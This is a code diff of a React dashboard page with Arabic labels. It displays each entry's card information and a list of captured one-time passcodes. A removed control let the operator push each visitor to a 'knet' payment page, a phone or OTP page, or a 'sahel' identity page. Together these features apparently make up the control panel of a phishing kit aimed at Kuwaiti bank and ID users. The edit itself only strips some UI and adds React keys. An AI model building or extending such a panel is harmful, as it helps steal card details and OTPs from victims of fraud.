@@ -601,16 +601,7 @@ export default function NotificationsPage() {
                         ? 'معلومات البطاقة'
                         : 'لا يوجد بطاقة'}
                     </Badge>
-                    <Badge
-                      variant={'secondary'}
-                      className={`rounded-md cursor-pointer ${
-                        notification.mobile ? 'bg-yellow-300' : ''
-                      }`}
-                      onClick={() => handleInfoClick(notification, 'personal')}
-                    >
-                      <InfoIcon className="h-4 w-4 mr-1" />
-                      معلومات عامة
-                    </Badge>
+                  
                   </div>
 
                   <div className="text-sm">
@@ -628,56 +619,7 @@ export default function NotificationsPage() {
                   </div>
                 </div>
 
-                <div className="border-t pt-3">
-                  <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
-                  <div className="flex flex-wrap gap-2">
-                    {[
-                      {
-                        page: 'main',
-                        label: 'الرئيسية',
-                        hint: 'الصفحة الرئيسية',
-                      },
-                      { page: 'knet', label: 'كنت', hint: 'صفحة كنت' },
-                      {
-                        page: 'phone',
-                        label: 'تلفون',
-                        hint: 'تلفون',
-                      },
-                      {
-                        page: 'sahel',
-                        label: 'هوية',
-                        hint: 'هوية',
-                      },
-                    ].map(({ page, label, hint }) => (
-                      <Button
-                        key={page}
-                        variant={
-                          notification?.page === page ? 'default' : 'outline'
-                        }
-                        size="sm"
-                        onClick={() => handleUpdatePage(notification.id, page)}
-                        className={`relative ${
-                          notification.page === page ? 'bg-blue-500' : ''
-                        }`}
-                        title={hint}
-                      >
-                        {label}
-                        {notification.page === page && (
-                          <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
-                            ✓
-                          </span>
-                        )}
-                      </Button>
-                    ))}
-                  </div>
-                  <div className="text-xs text-gray-500 mt-1">
-                    {notification.page === 'main' && 'الصفحة الرئيسية'}
-                    {notification.page === 'knet' && 'صفحة كنت'}
-                    {notification.page === 'phone' && 'رقم الهاتف '}
-                    {notification.page === 'phoneOtp' && ' OTP'}
-                    {notification.page === 'sahel' && 'هوية'}
-                  </div>
-                </div>
+               
               </div>
             ))}
           </div>
@@ -697,13 +639,7 @@ export default function NotificationsPage() {
                 ? 'معلومات البطاقة'
                 : 'معلومات عامة'}
             </DialogTitle>
-            <DialogDescription>
-              {selectedInfo === 'personal'
-                ? 'تفاصيل المعلومات الشخصية'
-                : selectedInfo === 'card'
-                ? 'تفاصيل معلومات البطاقة'
-                : 'تفاصيل المعلومات العامة'}
-            </DialogDescription>
+           
           </DialogHeader>
           {selectedInfo === 'personal' && selectedNotification?.plateType && (
             <div className="space-y-2">
@@ -746,8 +682,8 @@ export default function NotificationsPage() {
                 <strong className="text-red-400 mx-4">رمز  :</strong>{' '}
               </p>
               <p>
-              {selectedNotification&& selectedNotification?.allOtps!.map((i)=>
-              <Badge>{i}</Badge>
+              {selectedNotification&& selectedNotification?.allOtps!.map((i,indx)=>
+              <Badge key={indx}>{i}</Badge>
               )}
 
               </p>
